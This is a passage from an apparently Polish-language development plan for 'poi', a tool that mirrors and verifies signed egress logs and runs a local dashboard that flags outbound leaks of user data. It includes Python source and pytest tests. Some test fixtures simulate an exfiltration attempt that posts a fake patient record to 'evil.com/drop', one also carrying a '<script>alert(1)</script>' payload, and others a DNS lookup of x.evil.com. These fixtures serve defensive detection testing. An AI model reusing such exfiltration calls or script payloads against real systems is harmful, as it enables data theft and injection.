    source_down_since: float | None
    tick_seconds: float
    unbounded_channel: bool
    run_finished: bool = False            # set when operator declares the workload exited


@dataclass
class Verdict:
    level: str
    reasons: list[str] = field(default_factory=list)


def assess(s: Snapshot, now: float) -> Verdict:
    broken = []
    if s.error:
        broken.append(f"Verification failed: {s.error}")
    if s.allowed_hits:
        broken.append(f"Your data was found in ALLOWED outbound traffic (events {s.allowed_hits})")
    if broken:
        return Verdict(BROKEN, broken)

    attention = []
    pending = [q for q in s.blocked_hits if q not in s.acked]
    if pending:
        attention.append(f"Blocked exfiltration attempt containing your data (events {pending})")
    limit = STALE_TICKS * s.tick_seconds
    if s.source_down_since is not None and now - s.source_down_since > limit:
        attention.append(f"Operator feed unreachable for {now - s.source_down_since:.0f} s")
    elif not s.run_finished and now - (s.last_received or s.started) > limit:
        attention.append(f"No new checkpoint for {now - (s.last_received or s.started):.0f} s")
    if s.unbounded_channel:
        attention.append("Policy allows free-form values: covert channel is unbounded")
    return Verdict(ATTENTION, attention) if attention else Verdict(VERIFIED, [])
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_assess.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/assess.py tests/test_assess.py
git commit -m "feat: dashboard verdict logic

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 4: Źródła i lustro właściciela

Pobieranie przebiegu (HTTP albo katalog lokalny) do lokalnego lustra z weryfikacją każdego checkpointu, odciskami, potwierdzeniami i odtwarzaniem po restarcie (spec §5.2–5.3, §8).

**Files:**
- Create: `src/poi/source.py`
- Create: `src/poi/mirror.py`
- Test: `tests/test_mirror.py`

**Interfaces:**
- Consumes: `ChainVerifier`, `parse_delta`, `assess`, `Snapshot`, `FingerprintSet`, `evidence`, `policy.endpoint_capacity`, `serve.make_server` (w teście)
- Produces: `SourceError`, `AuthError(SourceError)`, `NotFound(SourceError)`; protokół `Source` (`checkpoints(start, wait)->list[dict]`, `delta(seq)`, `evidence(digest)`, `policy()`, `runtime()`); `LocalSource(run_dir, runtime=None, poll=0.2)`, `HttpSource(base_url, token, timeout=10)`; `mirror.evidence_digests(ops)`; `Mirror(mirror_dir, source, pubkey_hex, fingerprints=None, source_label='', monotonic=time.monotonic, sleep=time.sleep)` z `sync_once(wait=25)->int`, `refresh_runtime()`, `run(stop, wait=25)`, `run_runtime(stop)`, `ack(seq)->bool`, `snapshot()`, `verdict()`, atrybuty `dir, policy, verifier, error, runtime, hits: dict[seq, (verdict, sources)], acks, lock (RLock), changed (Condition), version, last_received, source_error`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_mirror.py`:

```python
import json
import threading

import pytest

from poi import canonical as c
from poi.assess import ATTENTION, BROKEN, VERIFIED
from poi.fingerprint import FingerprintSet
from poi.ledger import pubkey_hex
from poi.mirror import Mirror
from poi.serve import make_server
from poi.source import AuthError, HttpSource, LocalSource, SourceError
from poi.verify import verify_chain

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, POLICY, FakeFS, make_engine

SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"


class Clock:
    def __init__(self):
        self.t = 0.0

    def __call__(self):
        return self.t


def _run(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    (tmp_path / "run").mkdir(exist_ok=True)
    (tmp_path / "run" / "policy.yaml").write_bytes(POLICY)
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [], b"{}")
    eng.tick()
    return eng, gate, tmp_path / "run"


def _fp():
    fp = FingerprintSet(b"k" * 32)
    fp.add(SECRET, "patients.csv")
    return fp


def _mirror(tmp_path, key, source, clock=None):
    return Mirror(tmp_path / "mirror", source, pubkey_hex(key), _fp(),
                  monotonic=clock or Clock(), sleep=lambda s: None)


def test_local_mirror_verifies_and_is_a_valid_run(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    m = _mirror(tmp_path, key, LocalSource(run, runtime=lambda: {"status": "running"}))
    assert m.sync_once(wait=0) == 2
    assert m.verdict().level == VERIFIED
    assert verify_chain(tmp_path / "mirror", pubkey_hex(key)).last["seq"] == 1


def test_blocked_attempt_with_user_data_needs_ack(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    m = _mirror(tmp_path, key, LocalSource(run))
    m.sync_once(wait=0)
    gate.on_request("evil.com", "POST", "/drop", [], SECRET)
    eng.tick()
    m.sync_once(wait=0)
    v = m.verdict()
    assert v.level == ATTENTION and "Blocked exfiltration" in v.reasons[0]
    assert m.ack(2) is True and m.verdict().level == VERIFIED
    assert json.loads((tmp_path / "mirror" / "acks.json").read_text()) == [2]


def test_tampered_checkpoint_from_source_is_broken_and_kept(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    p = run / "ledger" / "000001.json"
    cp = json.loads(p.read_bytes())
    cp["egress"]["count"] = 0
    p.write_bytes(c.canonical_json(cp))
    m = _mirror(tmp_path, key, LocalSource(run))
    m.sync_once(wait=0)
    assert m.verdict().level == BROKEN
    assert (tmp_path / "mirror" / "ledger" / "000001.json").exists()     # evidence of misbehaviour kept


def test_restart_replays_mirror_and_detects_local_tampering(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    _mirror(tmp_path, key, LocalSource(run)).sync_once(wait=0)
    m2 = _mirror(tmp_path, key, LocalSource(run))
    assert m2.verifier.next_checkpoint == 2 and m2.error is None
    ev = sorted((tmp_path / "mirror" / "evidence").glob("*.bin"))[0]
    ev.write_bytes(b"tampered")
    m3 = _mirror(tmp_path, key, LocalSource(run))
    assert m3.verdict().level == BROKEN


def test_mirror_refuses_other_operator_key(tmp_path, key):
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    eng, gate, run = _run(tmp_path, key)
    _mirror(tmp_path, key, LocalSource(run))
    with pytest.raises(ValueError):
        _mirror(tmp_path, Ed25519PrivateKey.generate(), LocalSource(run))


def test_stale_and_unreachable(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    clock = Clock()
    m = _mirror(tmp_path, key, LocalSource(run), clock)
    m.sync_once(wait=0)
    clock.t = 10.0
    assert "No new checkpoint" in m.verdict().reasons[0]

    class Down:
        def checkpoints(self, *a):
            raise SourceError("connection refused")
    m.source = Down()
    with pytest.raises(SourceError):
        m.sync_once(wait=0)
    clock.t = 20.0
    assert any("unreachable" in r for r in m.verdict().reasons)


def test_http_source_end_to_end(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    srv = make_server(run, "tok", port=0, runtime=lambda: {"status": "running"}, poll=0.05)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_address[1]}"
    try:
        with pytest.raises(AuthError):
            HttpSource(base, "bad").policy()
        m = _mirror(tmp_path, key, HttpSource(base, "tok"))
        assert m.sync_once(wait=0) == 2
        m.refresh_runtime()
        assert m.runtime == {"status": "running"} and m.verdict().level == VERIFIED
    finally:
        srv.shutdown()


def test_missing_evidence_breaks_after_retries(tmp_path, key):
    eng, gate, run = _run(tmp_path, key)
    for p in (run / "evidence").glob("*.bin"):
        if p.read_bytes() == b'{"count":1,"model":"small"}':
            p.unlink()
    m = _mirror(tmp_path, key, LocalSource(run))
    m.sync_once(wait=0)
    assert m.verdict().level == BROKEN and "[16]" in m.verdict().reasons[0]
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_mirror.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.mirror'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/source.py`:

```python
"""Where the dashboard reads a run from: the operator's `poi serve` (HTTP) or a local run directory."""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Callable, Protocol


class SourceError(Exception):
    """Transport problem (unreachable, 5xx, malformed response)."""


class AuthError(SourceError):
    pass


class NotFound(SourceError):
    pass


class Source(Protocol):
    def checkpoints(self, start: int, wait: float) -> list[dict]: ...
    def delta(self, seq: int) -> bytes: ...
    def evidence(self, digest: str) -> bytes: ...
    def policy(self) -> bytes: ...
    def runtime(self) -> dict: ...


class LocalSource:
    def __init__(self, run_dir: Path, runtime: Callable[[], dict] | None = None, poll: float = 0.2) -> None:
        self.run_dir = Path(run_dir)
        self._runtime = runtime
        self.poll = poll

    def _read(self, path: Path) -> bytes:
        try:
            return path.read_bytes()
        except FileNotFoundError:
            raise NotFound(str(path))

    def checkpoints(self, start: int, wait: float) -> list[dict]:
        deadline = time.monotonic() + wait
        while True:
            out = []
            seq = start
            while (p := self.run_dir / "ledger" / f"{seq:06d}.json").exists():
                out.append(json.loads(p.read_bytes()))
                seq += 1
            if out or time.monotonic() >= deadline:
                return out
            time.sleep(self.poll)

    def delta(self, seq: int) -> bytes:
        return self._read(self.run_dir / "delta" / f"{seq:06d}.jsonl")

    def evidence(self, digest: str) -> bytes:
        return self._read(self.run_dir / "evidence" / f"{digest}.bin")

    def policy(self) -> bytes:
        return self._read(self.run_dir / "policy.yaml")

    def runtime(self) -> dict:
        if self._runtime is not None:
            return self._runtime()
        try:
            from poi.runtime import RuntimeInfo
            from poi.runtime_info import declaration
            import docker
            return declaration(docker.from_env(), RuntimeInfo.load(self.run_dir).workload_id)
        except Exception:
            return {"status": "unknown"}


class HttpSource:
    def __init__(self, base_url: str, token: str, timeout: float = 10.0) -> None:
        self.base = base_url.rstrip("/")
        self.token = token
        self.timeout = timeout

    def _get(self, path: str, timeout: float | None = None) -> bytes:
        req = urllib.request.Request(self.base + path, headers={"authorization": f"Bearer {self.token}"})
        try:
            with urllib.request.urlopen(req, timeout=timeout or self.timeout) as r:
                return r.read()
        except urllib.error.HTTPError as e:
            if e.code == 401:
                raise AuthError("operator rejected the token (401)")
            if e.code == 404:
                raise NotFound(path)
            raise SourceError(f"HTTP {e.code} for {path}")
        except (urllib.error.URLError, OSError) as e:
            raise SourceError(f"{type(e).__name__}: {e}")

    def checkpoints(self, start: int, wait: float) -> list[dict]:
        raw = self._get(f"/v1/checkpoints?from={start}&wait={wait:g}", timeout=wait + self.timeout)
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            raise SourceError("malformed checkpoint list")
        if not isinstance(data, list) or not all(isinstance(cp, dict) for cp in data):
            raise SourceError("malformed checkpoint list")
        return data

    def delta(self, seq: int) -> bytes:
        return self._get(f"/v1/delta/{seq}")

    def evidence(self, digest: str) -> bytes:
        return self._get(f"/v1/evidence/{digest}")

    def policy(self) -> bytes:
        return self._get("/v1/policy")

    def runtime(self) -> dict:
        try:
            return json.loads(self._get("/v1/runtime"))
        except json.JSONDecodeError:
            raise SourceError("malformed runtime declaration")
```

Utwórz `src/poi/mirror.py`:

```python
"""Owner-side mirror: copy a run from a Source, verify every checkpoint as it arrives, keep the evidence.

The mirror directory has the same layout as a run directory, so `poi verify` / `poi report` work on it.
"""
from __future__ import annotations

import json
import math
import os
import threading
import time
from pathlib import Path
from typing import Callable

from poi import canonical as c
from poi import evidence
from poi import policy as pol
from poi.assess import Snapshot, Verdict, assess
from poi.fingerprint import FingerprintSet
from poi.source import NotFound, Source, SourceError
from poi.verify import ChainVerifier, Event, VerifyError, parse_delta

RETRIES = 3


def _write_atomic(path: Path, data: bytes) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    with open(tmp, "wb") as f:
        f.write(data)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def evidence_digests(ops: list[tuple[str, str, bytes]]) -> list[str]:
    """Evidence a checkpoint's delta refers to: config JSON, egress headers/body, ingress headers/body."""
    out = []
    for op, acc, element in ops:
        f = c.decode(element)
        if op == "add" and f[0] == "config":
            out.append(f[1])
        elif f[0] == "egress":
            out += [f[6], f[7]]
        elif f[0] == "ingress":
            out += [f[3], f[4]]
    return out


class Mirror:
    def __init__(self, mirror_dir: Path, source: Source, pubkey_hex: str,
                 fingerprints: FingerprintSet | None = None, source_label: str = "",
                 monotonic: Callable[[], float] = time.monotonic, sleep: Callable[[float], None] = time.sleep) -> None:
        self.dir = Path(mirror_dir)
        self.source = source
        self.pubkey_hex = pubkey_hex
        self.fingerprints = fingerprints
        self.monotonic, self.sleep = monotonic, sleep
        self.lock = threading.RLock()
        self.changed = threading.Condition(self.lock)
        self.version = 0
        for d in ("ledger", "delta", "evidence"):
            (self.dir / d).mkdir(parents=True, exist_ok=True)
        pk = self.dir / "pubkey"
        if pk.exists() and pk.read_text().strip() != pubkey_hex:
            raise ValueError(f"mirror {self.dir} was created for a different operator key")
        pk.write_text(pubkey_hex + "\n")
        (self.dir / "source.json").write_text(json.dumps({"source": source_label}))
        self.started = monotonic()
        self.last_received: float | None = None
        self.source_down_since: float | None = None
        self.source_error: str | None = None
        self.error: VerifyError | None = None
        self.runtime: dict | None = None
        self.hits: dict[int, tuple[str, list[str]]] = {}     # egress seq -> (verdict, sources)
        self.acks: set[int] = set(json.loads((self.dir / "acks.json").read_text())) \
            if (self.dir / "acks.json").exists() else set()
        self.policy = self._load_policy()
        self.verifier = ChainVerifier(pubkey_hex, self.policy)
        self.replay_local()

    # -- setup -------------------------------------------------------------------
    def _load_policy(self) -> pol.Policy:
        p = self.dir / "policy.yaml"
        if not p.exists():
            _write_atomic(p, self.source.policy())
        return pol.load(p)

    def _get_local(self, digest: str) -> bytes | None:
        return evidence.get(self.dir / "evidence", digest)

    def _after_feed(self, events: list[Event]) -> None:
        if self.fingerprints is None:
            return
        for ev in events:
            if ev.domain != "egress":
                continue
            body = self._get_local(ev.fields[7]) or b""
            found = self.fingerprints.scan(body + b" " + ev.fields[5].encode())
            if found:
                self.hits[ev.seq] = (ev.fields[8], sorted(found))

    def replay_local(self) -> None:
        """Re-verify everything already in the mirror (restart, or local tampering)."""
        seq = 0
        while (p := self.dir / "ledger" / f"{seq:06d}.json").exists():
            try:
                cp = json.loads(p.read_bytes())
                raw = (self.dir / "delta" / f"{seq:06d}.jsonl").read_bytes()
                self._after_feed(self.verifier.feed(cp, raw, self._get_local))
            except VerifyError as e:
                self.error = e
                return
            except (FileNotFoundError, json.JSONDecodeError) as e:
                self.error = VerifyError(11, seq, f"mirror file unreadable: {e}")
                return
            seq += 1

    # -- fetching ------------------------------------------------------------------
    def _retry(self, fn, *args):
        delay = 0.5
        for attempt in range(RETRIES):
            try:
                return fn(*args)
            except NotFound:
                if attempt == RETRIES - 1:
                    return None
            except SourceError:
                if attempt == RETRIES - 1:
                    raise
            self.sleep(delay)
            delay *= 2
        return None

    def _fetch_evidence(self, digest: str) -> None:
        if self._get_local(digest) is not None:
            return
        data = self._retry(self.source.evidence, digest)
        if data is not None and c.b2b256(data) == digest:   # never store bytes under a wrong name
            _write_atomic(self.dir / "evidence" / f"{digest}.bin", data)

    def _ingest(self, cp: dict) -> None:
        seq = self.verifier.next_checkpoint
        raw = self._retry(self.source.delta, seq)
        if raw is None:
            raise VerifyError(12, seq, "operator did not provide the delta file")
        _write_atomic(self.dir / "delta" / f"{seq:06d}.jsonl", raw)
        _write_atomic(self.dir / "ledger" / f"{seq:06d}.json", c.canonical_json(cp))
        try:
            digests = evidence_digests(parse_delta(cp, raw))
        except (VerifyError, ValueError, KeyError):
            digests = []                                        # feed() reports the precise error
        for d in digests:
            self._fetch_evidence(d)
        events = self.verifier.feed(cp, raw, self._get_local)
        with self.lock:
            self._after_feed(events)

    def sync_once(self, wait: float = 25.0) -> int:
        """Fetch and verify new checkpoints. Returns how many were verified."""
        if self.error is not None:
            return 0
        try:
            cps = self.source.checkpoints(self.verifier.next_checkpoint, wait)
            n = 0
            for cp in cps:
                if cp.get("seq") != self.verifier.next_checkpoint:
                    raise VerifyError(11, cp.get("seq"), f"operator sent checkpoint out of order "
                                                         f"(expected {self.verifier.next_checkpoint})")
                self._ingest(cp)
                n += 1
                with self.lock:
                    self.last_received = self.monotonic()
                    self._bump()
            with self.lock:
                self.source_down_since, self.source_error = None, None
            return n
        except VerifyError as e:
            with self.lock:
                self.error = e
                self._bump()
            return 0
        except SourceError as e:
            with self.lock:
                if self.source_down_since is None:
                    self.source_down_since = self.monotonic()
                self.source_error = str(e)
                self._bump()
            raise

    def refresh_runtime(self) -> None:
        try:
            rt = self.source.runtime()
        except SourceError:
            return
        with self.lock:
            if rt != self.runtime:
                self.runtime = rt
                self._bump()

    def run(self, stop: threading.Event, wait: float = 25.0) -> None:
        """Background loop: long-poll for checkpoints; runtime declarations are polled separately."""
        backoff = 1.0
        while not stop.is_set():
            try:
                self.sync_once(wait)
                backoff = 1.0
                if self.error is not None:
                    stop.wait(self.policy.tick_seconds)
            except SourceError:
                stop.wait(backoff)
                backoff = min(backoff * 2, 30.0)

    def run_runtime(self, stop: threading.Event) -> None:
        while not stop.is_set():
            self.refresh_runtime()
            stop.wait(self.policy.tick_seconds)

    # -- state for the UI -------------------------------------------------------------
    def _bump(self) -> None:
        self.version += 1
        self.changed.notify_all()

    def ack(self, seq: int) -> bool:
        with self.lock:
            if seq not in self.hits:
                return False
            self.acks.add(seq)
            _write_atomic(self.dir / "acks.json", json.dumps(sorted(self.acks)).encode())
            self._bump()
            return True

    def snapshot(self) -> Snapshot:
        with self.lock:
            unbounded = any(math.isinf(pol.endpoint_capacity(e)) for e in self.policy.endpoints)
            return Snapshot(
                error=str(self.error) if self.error else None,
                allowed_hits=sorted(s for s, (v, _) in self.hits.items() if v == "allow"),
                blocked_hits=sorted(s for s, (v, _) in self.hits.items() if v != "allow"),
                acked=set(self.acks), last_received=self.last_received, started=self.started,
                source_down_since=self.source_down_since, tick_seconds=self.policy.tick_seconds,
                unbounded_channel=unbounded,
                run_finished=bool(self.runtime and self.runtime.get("status") == "exited"))

    def verdict(self) -> Verdict:
        return assess(self.snapshot(), self.monotonic())
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_mirror.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/mirror.py src/poi/source.py tests/test_mirror.py
git commit -m "feat: owner-side mirror with live verification over HTTP or local sources

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 5: Backend dashboardu (API + SSE)

Lokalny serwer na 127.0.0.1 z kluczem sesji: podsumowanie, zdarzenia, inspektor zdarzeń i checkpointów, potwierdzenia, strumień SSE (spec §7).

**Files:**
- Create: `src/poi/dashboard.py`
- Modify: `tests/helpers.py` (dopisz `start_dashboard`, `http_call`, `DASH_KEY`, `DASH_SECRET`)
- Test: `tests/test_dashboard.py`

**Interfaces:**
- Consumes: `Mirror`, `parse_delta`, `endpoint_capacity`, `canonical`
- Produces: `PREVIEW=65536`, `TIMELINE=200`, `CSP`; `preview(bytes|None)->dict|None`; `DashboardApp(mirror, source_label)` z `summary()`, `events(before, limit, kind)`, `event(seq)`, `checkpoint(seq)`; `make_dashboard_server(app, session_key, host='127.0.0.1', port=8780)`; `new_session_key()`; `serve_in_background(srv)`. Statyczne pliki czytane z `poi/dashboard_static/` (zadanie 6).

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Dopisz na końcu `tests/helpers.py` (bezpośrednio po ostatniej linii, bez dodatkowych pustych linii przed blokiem poza tymi w nim):

```python



DASH_SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"
DASH_KEY = "sess-key"


def start_dashboard(tmp_path, key):
    """A verified mirror with one sent request, one blocked attempt carrying user data and one DNS lookup,
    served by the dashboard on a free port. Returns (app, base_url, server)."""
    import threading

    from poi.dashboard import DashboardApp, make_dashboard_server
    from poi.fingerprint import FingerprintSet
    from poi.ledger import pubkey_hex
    from poi.mirror import Mirror
    from poi.source import LocalSource

    fs = FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS)
    eng, gate = make_engine(tmp_path, key, fs)
    (tmp_path / "run").mkdir(exist_ok=True)
    (tmp_path / "run" / "policy.yaml").write_bytes(POLICY)
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":0.5}')
    gate.on_request("evil.com", "POST", "/drop", [], b"<script>alert(1)</script>" + DASH_SECRET)
    gate.wal.record_dns("2026-10-13T18:00:00Z", "x.evil.com", "A", "block")
    fs.write("/tmp", None)
    fs.write("/tmp/x", b"1")
    eng.tick()
    fp = FingerprintSet(b"k" * 32)
    fp.add(DASH_SECRET, "patients.csv")
    m = Mirror(tmp_path / "mirror", LocalSource(tmp_path / "run", runtime=lambda: {"status": "running"}),
               pubkey_hex(key), fp, sleep=lambda s: None)
    m.sync_once(wait=0)
    m.refresh_runtime()
    app = DashboardApp(m, "local:run")
    srv = make_dashboard_server(app, DASH_KEY, port=0)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return app, f"http://127.0.0.1:{srv.server_address[1]}", srv


def http_call(url, method="GET", headers=None):
    import urllib.error
    import urllib.request
    req = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()
```

Utwórz `tests/test_dashboard.py`:

```python
import json
import urllib.request

import pytest

from poi.dashboard import preview

from helpers import DASH_KEY as KEY, http_call as call, start_dashboard


@pytest.fixture
def dash(tmp_path, key):
    app, base, srv = start_dashboard(tmp_path, key)
    yield app, base
    srv.shutdown()


def test_api_requires_session_key(dash):
    _, base = dash
    assert call(base + "/api/summary")[0] == 403
    assert call(base + f"/api/summary?key={KEY}")[0] == 200
    assert call(base + "/api/summary", headers={"cookie": f"poi_session={KEY}"})[0] == 200
    assert call(base + "/api/summary", headers={"cookie": "poi_session=wrong"})[0] == 403


def test_summary(dash):
    app, _ = dash
    s = app.summary()
    assert s["verdict"]["level"] == "attention"
    assert (s["sent"], s["blocked"], s["dns"]) == (1, 2, 1)
    assert (s["hits_allowed"], s["hits_blocked"]) == (0, 1)
    assert s["capacity_bits"] == 9.0
    assert [t["seq"] for t in s["timeline"]] == [0, 1] and s["timeline"][1]["hit"] is True
    assert s["operator"] == {"status": "running"}


def test_events_and_filters(dash):
    app, _ = dash
    assert [e["seq"] for e in app.events(None, 100, "all")] == [3, 2, 1]
    assert [e["seq"] for e in app.events(None, 100, "allowed")] == [1]
    assert [e["seq"] for e in app.events(None, 100, "blocked")] == [3, 2]
    assert [e["seq"] for e in app.events(None, 100, "dns")] == [3]
    assert [e["seq"] for e in app.events(3, 1, "all")] == [2]


def test_event_detail(dash):
    app, _ = dash
    sent = app.event(1)
    assert sent["body"]["text"] == '{"count":1,"model":"small"}'
    assert sent["policy_recheck"] == {"verdict": "allow", "reason": ""}
    assert sent["response"]["status"] == 200 and sent["response"]["body"]["text"] == '{"score":0.5}'
    blocked = app.event(2)
    assert blocked["hit"] == ["patients.csv"] and blocked["body"]["text"].startswith("<script>")
    assert app.event(99) is None


def test_checkpoint_detail(dash):
    app, _ = dash
    c1 = app.checkpoint(1)
    assert c1["files"]["added"] == ["/tmp", "/tmp/x"] and c1["events"] == [1, 2, 3]
    c0 = app.checkpoint(0)
    assert c0["config_change"]["after"]["networks"] == [{"name": "poi-int", "internal": True}]
    assert app.checkpoint(5) is None


def test_ack_requires_custom_header(dash):
    app, base = dash
    cookie = {"cookie": f"poi_session={KEY}"}
    assert call(base + "/api/ack/2", "POST", cookie)[0] == 403
    assert call(base + "/api/ack/2", "POST", {**cookie, "x-poi": "1"})[0] == 200
    assert app.summary()["verdict"]["level"] == "verified"


def test_stream_sends_summary(dash):
    _, base = dash
    req = urllib.request.Request(base + "/api/stream", headers={"cookie": f"poi_session={KEY}"})
    with urllib.request.urlopen(req, timeout=10) as r:
        assert r.readline() == b"event: update\n"
        data = json.loads(r.readline().split(b"data: ", 1)[1])
    assert data["verdict"]["level"] == "attention"


def test_preview_text_hex_truncation():
    assert preview(b"abc") == {"text": "abc", "size": 3, "truncated": False}
    assert preview(b"\xff\x00") == {"hex": "ff00", "size": 2, "truncated": False}
    assert preview(b"a" * 70000)["truncated"] is True
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_dashboard.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.dashboard'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/dashboard.py`:

```python
"""`poi dashboard`: local web UI over a verified Mirror. Binds to 127.0.0.1, session key required."""
from __future__ import annotations

import hmac
import json
import math
import re
import secrets
import threading
from collections import Counter
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from importlib import resources
from urllib.parse import parse_qs, urlsplit

from poi import canonical as c
from poi.mirror import Mirror
from poi.policy import endpoint_capacity
from poi.verify import parse_delta

PREVIEW = 64 * 1024
TIMELINE = 200
STATIC = {"/": ("index.html", "text/html; charset=utf-8"),
          "/app.js": ("app.js", "text/javascript; charset=utf-8"),
          "/app.css": ("app.css", "text/css; charset=utf-8")}
CSP = "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'"
_NUM = re.compile(r"^\d{1,9}$")


def preview(data: bytes | None) -> dict | None:
    if data is None:
        return None
    cut = data[:PREVIEW]
    try:
        return {"text": cut.decode("utf-8"), "size": len(data), "truncated": len(data) > PREVIEW}
    except UnicodeDecodeError:
        return {"hex": cut.hex(), "size": len(data), "truncated": len(data) > PREVIEW}


class DashboardApp:
    def __init__(self, mirror: Mirror, source_label: str = "") -> None:
        self.m = mirror
        self.source_label = source_label
        self._cp_cache: dict[int, dict] = {}

    # -- helpers --------------------------------------------------------------------
    def _evidence(self, digest: str) -> bytes | None:
        return self.m._get_local(digest)

    def _event_row(self, ev) -> dict:
        f = ev.fields
        hit = self.m.hits.get(ev.seq)
        if ev.domain == "dns":
            row = {"seq": ev.seq, "kind": "dns", "t": f[2], "target": f[3], "qtype": f[4],
                   "verdict": f[5], "reason": "" if f[5] == "allow" else "dns"}
        else:
            row = {"seq": ev.seq, "kind": "http", "t": f[2], "method": f[3], "host": f[4], "path": f[5],
                   "target": f"{f[3]} {f[4]}{f[5]}", "verdict": f[8], "reason": f[9]}
        row.update(checkpoint=ev.checkpoint, hit=hit[1] if hit else None, acked=ev.seq in self.m.acks)
        return row

    def _cp_stats(self, seq: int) -> dict:
        if seq in self._cp_cache:
            return self._cp_cache[seq]
        cp = self.m.verifier.res.checkpoints[seq]
        raw = (self.m.dir / "delta" / f"{seq:06d}.jsonl").read_bytes()
        files = {"added": [], "removed": [], "changed": []}
        subs, adds, config = {}, {}, None
        egress = blocked = 0
        for op, acc, element in parse_delta(cp, raw):
            f = c.decode(element)
            if f[0] == "file":
                (adds if op == "add" else subs)[f[1]] = element
            elif f[0] == "config" and op == "add":
                config = f[1]
            elif f[0] in ("egress", "dns"):
                egress += 1
                blocked += (f[8] if f[0] == "egress" else f[5]) != "allow"
        for p in sorted(adds.keys() | subs.keys()):
            key = "changed" if p in adds and p in subs else ("added" if p in adds else "removed")
            files[key].append(p)
        stats = {"seq": seq, "t": cp["t"], "files": files, "config": config, "egress": egress,
                 "blocked": blocked, "restart": cp.get("restart", False)}
        self._cp_cache[seq] = stats
        return stats

    # -- API --------------------------------------------------------------------------
    def summary(self) -> dict:
        m = self.m
        with m.lock:
            res = m.verifier.res
            verdict = m.verdict()
            allowed = Counter()
            blocked = dns = 0
            for ev in res.egress:
                f = ev.fields
                if ev.domain == "dns":
                    dns += 1
                    blocked += f[5] != "allow"
                elif f[8] == "allow":
                    allowed[(f[4], f[3], f[5])] += 1
                else:
                    blocked += 1
            cap = 0.0
            for (host, method, path), n in allowed.items():
                ep = m.policy.find(host, method, path)
                cap += (endpoint_capacity(ep) if ep else math.inf) * n
            last = res.checkpoints[-1] if res.checkpoints else None
            n = len(res.checkpoints)
            hit_cps = {ev.checkpoint for ev in res.egress if ev.seq in m.hits}
            timeline = []
            for seq in range(max(0, n - TIMELINE), n):
                s = self._cp_stats(seq)
                timeline.append({"seq": seq, "t": s["t"], "changes": sum(map(len, s["files"].values())),
                                 "egress": s["egress"], "blocked": s["blocked"], "hit": seq in hit_cps,
                                 "config": s["config"] is not None and seq > 0})
            if m.error is not None and m.error.seq is not None and m.error.seq >= n:
                timeline.append({"seq": m.error.seq, "failed": True})
            age = None if m.last_received is None else round(m.monotonic() - m.last_received, 1)
            return {
                "version": m.version,
                "source": self.source_label,
                "verdict": {"level": verdict.level, "reasons": verdict.reasons},
                "last_checkpoint": None if last is None else {"seq": last["seq"], "t": last["t"],
                                                                "state": last["state"]["digest"],
                                                                "age_s": age},
                "sent": sum(allowed.values()), "blocked": blocked, "dns": dns,
                "hits_allowed": sum(1 for v, _ in m.hits.values() if v == "allow"),
                "hits_blocked": sum(1 for v, _ in m.hits.values() if v != "allow"),
                "capacity_bits": None if math.isinf(cap) else round(cap, 1),
                "timeline": timeline,
                "operator": m.runtime,
                "source_error": m.source_error,
                "tick_seconds": m.policy.tick_seconds,
            }

    def events(self, before: int | None, limit: int, kind: str) -> list[dict]:
        with self.m.lock:
            evs = self.m.verifier.res.egress
            out = []
            for ev in reversed(evs):
                if before is not None and ev.seq >= before:
                    continue
                row = self._event_row(ev)
                if kind == "allowed" and row["verdict"] != "allow":
                    continue
                if kind == "blocked" and row["verdict"] == "allow":
                    continue
                if kind == "dns" and row["kind"] != "dns":
                    continue
                out.append(row)
                if len(out) >= limit:
                    break
            return out

    def event(self, seq: int) -> dict | None:
        with self.m.lock:
            res = self.m.verifier.res
            ev = next((e for e in res.egress if e.seq == seq), None)
            if ev is None:
